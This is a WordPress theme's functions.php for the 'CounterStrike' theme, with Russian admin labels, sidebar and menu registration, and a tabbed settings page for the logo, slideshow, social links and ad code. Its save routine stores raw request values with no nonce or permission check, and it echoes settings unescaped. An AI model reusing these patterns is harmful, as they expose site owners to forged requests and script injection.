<?php
if ( function_exists('register_sidebar') ) {
	register_sidebars(array(
		'name' => 'Sidebar',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
}
if ( function_exists('register_sidebar') ) {
    register_sidebar(array(
		'name' => 'Footer Left',
	  'before_widget' => '<li>',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));

	if ( function_exists('register_sidebar') )
    register_sidebar(array(
		'name' => 'Footer Center',
      'before_widget' => '<li>',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));

	if ( function_exists('register_sidebar') )
    register_sidebar(array(
		'name' => 'Footer Right',
       'before_widget' => '<li>',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));

	}

$themename = "CounterStrike";
$shortname = str_replace(' ', '_', strtolower($themename));

function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}

function cats_to_select()
{
	$categories = get_categories('hide_empty=0'); 
	$categories_array[] = array('value'=>'0', 'title'=>'Select');
	foreach ($categories as $cat) {
		if($cat->category_count == '0') {
			$posts_title = 'No posts!';
		} elseif($cat->category_count == '1') {
			$posts_title = '1 post';
		} else {
			$posts_title = $cat->category_count . ' posts';
		}
		$categories_array[] = array('value'=> $cat->cat_ID, 'title'=> $cat->cat_name . ' ( ' . $posts_title . ' )');
	  }
	return $categories_array;
}

$options = array (
			
	array(	"type" => "open"),
	
	array(	"name" => "Изображение логотипа",
		"desc" => "Введите полный путь к изображению логотипа. Оставьте пустым это поле, если Вы не хотите использовать изображение логотипа. <br/>Нажмите, чтобы загрузить логотип > Перетащите или выберите файл > Вставьте в запись > Сохраните",
		"id" => $shortname."_logo",
		"std" =>  get_bloginfo('template_url') . "/images/logo.png",
		"type" =>"image_upload" ), 
		

array(    "name" => "Настройки меню",
     "desc" => "Пожалуйста, используйте <a href=\"nav-menus.php\">панель меню</a>, для управления и организации элементов. Главное меню отображает список страниц, а если меню отсутствует, то выбирается из панели меню.",
     "type" => "none"),
array(    "name" => "Ссылка читать далее",
		     "desc" => "Если Вы предпочитаете показывать ссылку Читать далее на главной странице, тогда убедитесь, что при написании постов нажимаете Insert More Tag, проверить можно <a href=\"http://themepix.com/pix/img/insert-more-tag.jpg\" target=\"_blank\">здесь</a>.",
		     "type" => "none"),

array(	"name" => "Рубрика популярных записей?",
			"desc" => "Снимите флажок, если не хотите отображать популярные записи в сайдбаре.",
			"id" => $shortname."_popular_posts",
			"std" => "true",
			"type" => "checkbox"),
	
         array(	"name" => "Популярное видео",
		"desc" => "Введите id видео с Youtube. Например: http://www.youtube.com/watch?v=<b>V7P6E69aihY</b>. ",
		"id" => $shortname."_video",
		"std" =>  'V7P6E69aihY',
		"type" => "text"),	
			
	array(	"name" => "Скрипты заголовка",
		"desc" => "Данный код будет добавлен сразу перед тэгами &lt;/head&gt;. Полезно, если вы хотите добавить внешний код, например, Google webmaster и др.",
        "id" => $shortname."_head",
        "type" => "textarea"	
		),
		
	array(	"name" => "Скрипты подвала",
		"desc" => "Данный код будет сразу же добавлен перед тэгами &lt;/body&gt;. Полезно, если вы хотите добавить внешний код, например, Google Analytics и др.",
        "id" => $shortname."_footer",
        "type" => "textarea"	
		),		
array(	"type" => "close")



);

$options2 = array (

array(	"type" => "open"),
array(    "name" => "Как настроить слайдшоу?",
     "desc" => "Это очень просто, вам не надо менять изображения, это работает автоматически, просто следуйте инструкции: <br/>Создать новую запись > <a href=\"http://themepix.com/pix/img/set-feature-image.jpg\" target=\"_blank\">Задать популярное изображение</a> > Выберите (или добавьте) рубрику > Опубликовать > Вернуться обратно (в настройки) > Выберите рубрику слайдшоу.",
     "type" => "none"),
array(	"name" => "Включить слайдшоу?",
			"desc" => "Снимите флажок, если не хотите отображать слайдшоу на главной странице.",
			"id" => $shortname."_featured_posts",
			"std" => "true",
			"type" => "checkbox"),
		array(	"name" => "Рубрика слайдшоу", 
 "desc" => "Последние записи из выбранной рубрики будут перечислены как популярные на главной странице. <br />Выбранная рубрика должна содержать популярные изображения, поэтому при создании новых записей вы должны <b>задать популярное изображение</b>.",
			"id" => $shortname."_featured_posts_category",
			"options" => cats_to_select(),
			"std" => "0",
			"type" => "select"),
			array(	"type" => "close")
			
			
			
			);
			
			
$options3 = array (

array(	"type" => "open"),
	array(	"name" => "Включить виджет Twitter?",
			"desc" => "Поставьте флажок, чтобы отображать виджет Twitter в сайдбаре. Чтобы настроить его, пройдите в виджеты и введите ссылку на ваш профиль. Снимите флажок, если не хотите использовать виджет Twitter в сайдбаре.",
			"id" => $shortname."_twitter_widget",
			"std" => "true",
			"type" => "checkbox"),
			
	array(	"name" => "Включить виджет Facebook?",
			"desc" => "Поставьте флажок, чтобы отображать виджет Facebook в сайдбаре. Чтобы настроить его, пройдите в виджеты и введите ссылку на ваш профиль. Снимите флажок, если не хотите использовать виджет Facebook в сайдбаре.",
			"id" => $shortname."_facebook_widget",
			"std" => "true",
			"type" => "checkbox"),
	
array(	"name" => "Социальные иконки",
			"desc" => "Показывать социальные иконки над сайдбаром? Снимите флажок, если не хотите использовать. Также, вы можете ввести ссылки на ваш профиль.",
			"id" => $shortname."_socialnetworks",
			"std" => "true",
			"type" => "checkbox"),

array(	"name" => "RSS",
			"desc" => "Добавьте ссылку Feedburner, или любую другую ссылку на RSS канал. Оставьте пустым, если не хотите отображать иконку RSS.",
			"id" => $shortname."_rss",
			"std" => "http://feeds.feedburner.com/themepixcom",
			"type" => "text"),

array(	"name" => "Facebook",
			"desc" => "Добавьте ссылку на профиль в Facebook, для отображения иконки в вашем профайле. Оставьте пустым это поле, если не хотите отображать иконку Facebook.",
			"id" => $shortname."_facebook",
			"std" => "http://facebook.com/ThemePix",
			"type" => "text"),

array(	"name" => "Twitter",
			"desc" => "Добавьте ссылку на профиль в Twitter, для отображения Twitter-а в вашем профиле. Оставьте это поле пустым, если вы не хотите использовать иконку Twitter.",
			"id" => $shortname."_twitter",
			"std" => "http://twitter.com/ThemePix",
			"type" => "text"),
			
array(	"name" => "GooglePlus",
			"desc" => "Добавьте профиль Google Plus. Оставьте это поле пустым, если вы не хотите использовать иконку Google Plus.",
			"id" => $shortname."_googleplus",
			"std" => "https://plus.google.com/105902409914354750342/",
			"type" => "text"),

array(	"name" => "LinkedIn",
			"desc" => "Добавьте ссылку на профиль LinkedIn. Оставьте это поле пустым, если вы не хотите использовать иконку LinkedIn.",
			"id" => $shortname."_linkedin",
			"std" => "http://linkedin.com/yourprofile",
			"type" => "text"),

array(	"name" => "YouTube",
			"desc" => "Добавьте ссылку на профиль в YouTube. Оставьте это поле пустым, если вы не хотите использовать иконку YouTube.",
			"id" => $shortname."_youtube",
			"std" => "http://youtube.com/yourprofile",
			"type" => "text"),

array(	"name" => "eMail",
			"desc" => "Добавьте ваш eMail. Оставьте это поле пустым, если вы не хотите использовать иконку eMail.",
			"id" => $shortname."_email",
			"std" => "mailto:contact@themepix.com",
			"type" => "text"),

array(    "name" => "Другие социальные иконки?",
     "desc" => "Вы можете заменить текущие социальные иконки другими. Например, если у вас нет канал на YouTube, и он вам не нужен, но вы хотите заменить его на другие социальные иконки, например Pinterest. Просто вставьте ссылку на профиль в Pinterest в форму для YouTube, после чего зайдите в папку с темой и откройте images/social-icons/ и замените иконку YouTube иконкой Pinterest, а также убедитесь что иконка Pinterest называется youtube.png",
     "type" => "none"),

	array(	"type" => "close")



);

$options4 = array (
array(	"type" => "open"),
   	
            	array(	"name" => "Место для размещения верхнего сайдбара (125x125 px)",
		"desc" => "Код для размещения верхнего сайдбара. Вы можете использовать любой html код, включая код Adsense. Также вы можете отредактировать ссылки и изображение, если вы хотите отображать рекламу 125x125. Оставьте пустым, если не хотите отображать рекламу.",
        "id" => $shortname."_ad_sidebar_top",
        "type" => "textarea",
		"std" => '<a href="http://themepix.com"><img class="sidebaradbox" src="http://themepix.com/pix/uploads/ad-125.png" style="border: 0;" alt="Advertise Here" /></a> 
<a href="http://themepix.com"><img class="sidebaradbox" src="http://themepix.com/pix/uploads/ad2-125.png" style="border: 0;" alt="Advertise Here" /></a>'
		),

	array(	"name" => "Место размещения левого сайдбара",
		"desc" => "Вы можете использовать любой html код, включая код Adsense. Оставьте пустым, если не хотите отображать рекламу.",
        "id" => $shortname."_ad_sidebar1_bottom",
        "type" => "textarea",
		"std" => '<a href="http://themepix.com"><img src="http://themepix.com/pix/uploads/ad-160x600.png" style="border: 0;" alt="Advertise Here" /></a>'
		),	
array(	"name" => "Место размещения правого сайдбара",
		"desc" => "Вы можете использовать любой html код, включая код Adsense. Оставьте пустым, если не хотите отображать рекламу.",
        "id" => $shortname."_ad_sidebar2_bottom",
        "type" => "textarea",
		"std" => '<a href="http://themepix.com"><img src="http://themepix.com/pix/uploads/ad-250.png" style="border: 0;" alt="Advertise Here" /></a>'
		),	

array(    "name" => "Другие виды рекламы",
     "desc" => "Вы также можете размещать другие виды рекламы в сайдбаре. Пожалуйста используйте для этого <a href=\"widgets.php\">виджеты</a> и перетащите текстовый виджет, чтобы вставить рекламу или Adsense.",
     "type" => "none"),


	
	array(	"type" => "close")



);


function mytheme_add_admin() {
    global $themename, $shortname, $options, $options2,$options3,$options4;
	
    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
			
				foreach ($options2 as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options2 as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
				
				foreach ($options3 as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options3 as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                foreach ($options4 as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options4 as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
                    
                echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
                die;

        } 
    }

    add_theme_page($themename . " - настройки темы", "".$themename . " - настройки темы", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}

function mytheme_admin_init() {

    global $themename, $shortname, $options,$options2,$options3,$options4;
    
    $get_theme_options = get_option($shortname . '_options');
    if($get_theme_options != 'yes') {
    	$new_options = $options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
		$new_options = $options2;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
		$new_options = $options3;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['std'] ); 
		}
		$new_options = $options4;
		foreach ($new_options as $new_value) {
		 	update_option( $new_value['id'],  $new_value['std'] ); 
		}
    	update_option($shortname . '_options', 'yes');
    }
}

if(!function_exists('get_sidebars')) {
	function get_sidebars()
	{
		 get_sidebar();
	}
}
	

function mytheme_admin() {

    global $themename, $shortname, $options,$options2,$options3,$options4;

    if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated"><p><strong>Настройки темы '.$themename.' сохранены.</strong></p></div>';
    
?>
<div class="wrap">
<h2>Настройки темы <?php echo $themename; ?></h2>
<div style="border-bottom: 1px dotted #000; padding-bottom: 10px; margin: 10px;">Оставьте это поле пустым, если не хотите его отображать.</div>
<form method="post">
<div class="xfade">
<script type="text/javascript" src="<?php bloginfo('template_directory'); ?>/js/jquery.idTabs.min.js"></script>
<style>
.idTabs li {
    border-right: 1px solid #DDDDDD;
    float: left;
    margin: 0;
}
.idTabs li a {
    background: none repeat scroll 0 0 #FFFFFF;
    color: #000000;
    float: left;
    margin-top: 0;
    padding: 8px 30px;
    text-decoration: none;
}
.idTabs li a.selected {
    background: #EEEEEE;
    color: #000000;
    text-decoration: none;
}
#item2, #item3, #item1,#item4 {
    background-image: -moz-linear-gradient(center top , #FFFFFF, #F5F5F5);
    border: 1px solid #DDDDDD;
    margin: 0;
    padding: 0;
}
.clear {
    clear: both;
}
.idTabs {
    border-left: 1px solid #DDDDDD;
    border-top: 1px solid #DDDDDD;
    float: left;
    margin: 0 !important;
    padding: 0 !important;
}


</style>
  <ul class="idTabs"> 
  <li><a href="#item1">Основные настройки</a></li>
  <li><a href="#item2">Популярные записи</a></li>  
  <li><a href="#item3">Социальные настройки</a></li> 
  <li><a href="#item4">Размещение рекламы</a></li> 
</ul>
<div class="clear"></div>
<div class="items">
<?php 
   foreach ($options as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		
		?>
        <table width="100%" border="0" style=" padding:10px;" id="item1">
	    
		<?php break;
		
		case "close":
		?>
		
        </table>
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;
		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
 <tr>
            <td><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

<?php 
		break;
		case 'image_upload':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
			<input id="upload_image" type="text" size="80" name="<?php echo $value['id']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" />
			<input id="upload_image_button" type="button" value="Upload Logo" /><br/> 
			<img style="margin:15px 0" src="<?php echo get_theme_settings( $value['id'] ); ?>" alt="Current Logo"/></td> 
        </tr>

       <tr>
            <td><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            

 <?php 		break;
                 case "none":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"></td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

        <?php 		break;
	
 
} 
}
   
?>
<!-- options 2 -->
<?php
if (is_array($options2))
{ 
   foreach ($options2 as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		
		?>
        <table width="100%" border="0" style=" padding:10px;" id="item2">
	    
		<?php break;
		
		case "close":
		?>
		
        </table>
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;
		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
<?php 		break;
                 case "none":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"></td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

        <?php 		break;
	
 
} 
}}
   
?>

<!-- options 3 -->
<?php 
  
if (is_array($options3))
{ 
   foreach ($options3 as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		
		?>
        <table width="100%" border="0" style="padding:10px;" id="item3">
	    
		<?php break;
		
		case "close":
		?>
		
        </table>
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;
		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></small></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
<?php 		break;
                 case "none":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"></td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

        <?php 		break;
	
 
} 
}
}
?>

<!-- options 4 -->
<?php 
  
if (is_array($options4))
{ 
   foreach ($options4 as $value) { 
    
	switch ( $value['type'] ) {
	
		case "open":
		
		?>
        <table width="100%" border="0" style="padding:10px;" id="item4">
	    
		<?php break;
		
		case "close":
		?>
		
        </table>
        
        
		<?php break;
		
		case "title":
		?>
		<table width="100%" border="0" style="padding:5px 10px;"><tr>
        	<td colspan="2"><h3 style="font-family:Georgia,'Times New Roman',Times,serif;"><?php echo $value['name']; ?></h3></td>
        </tr>
                
        
		<?php break;
		case 'text':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><input style="width:100%;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php echo get_theme_settings( $value['id'] ); ?>" /></td>
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'textarea':
		?>
        
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:100%; height:140px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php echo get_theme_settings( $value['id'] ); ?></textarea></td>
            
        </tr>

        <tr>
            <td><?php echo $value['desc']; ?></small></td>
        </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php 
		break;
		
		case 'select':
		?>
        <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
            <td width="80%">
				<select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
					<?php 
						foreach ($value['options'] as $option) { ?>
						<option value="<?php echo $option['value']; ?>" <?php if ( get_theme_settings( $value['id'] ) == $option['value']) { echo ' selected="selected"'; } ?>><?php echo $option['title']; ?></option>
						<?php } ?>
				</select>
			</td>
       </tr>
                
       <tr>
            <td><?php echo $value['desc']; ?></small></td>
       </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

		<?php
        break;
            
		case "checkbox":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"><?php if(get_theme_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                        <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                        </td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>
            
<?php 		break;
                 case "none":
		?>
            <tr>
            <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
                <td width="80%"></td>
            </tr>
                        
            <tr>
                <td><?php echo $value['desc']; ?></td>
           </tr><tr><td colspan="2" style="margin-bottom:5px;border-bottom:1px dotted #DDDDDD;">&nbsp;</td></tr><tr><td colspan="2">&nbsp;</td></tr>

        <?php 		break;
	
 
} 
}
}
?>

<!--</table>-->

<p class="submit">
<input name="save" type="submit" class="button-primary" value="Сохранить" />    
<input type="hidden" name="action" value="save" />
</p>
<script type="text/javascript">
var fade = function(id,s){
  s.tabs.removeClass(s.selected);
  s.tab(id).addClass(s.selected);
  s.items.fadeOut();
  s.item(id).fadeIn();
  return false;
};
jQuery.fn.fadeTabs = jQuery.idTabs.extend(fade);
jQuery(".fade").fadeTabs();
</script>
</div>
</div>
</form>

<?php
}
mytheme_admin_init();
    global $pagenow;
    if(isset($_GET['activated'] ) && $pagenow == "themes.php") {
        wp_redirect( admin_url('themes.php?page=functions.php') );
        exit();
    }

add_action('admin_menu', 'mytheme_add_admin');

if ( function_exists("add_theme_support") ) { add_theme_support("post-thumbnails"); } 
    if(function_exists('add_custom_background')) {
        add_custom_background();
    }
    
    if ( function_exists( 'register_nav_menus' ) ) {
    	register_nav_menus(
    		array(
    		  'menu_1' => 'Menu 1',
    		  'menu_2' => 'Menu 2'
    		)
    	);
    }

function string_limit_words($string, $word_limit)
{
  $words = explode(' ', $string, ($word_limit + 1));
  if(count($words) > $word_limit)
  array_pop($words);
  return implode(' ', $words);
}	
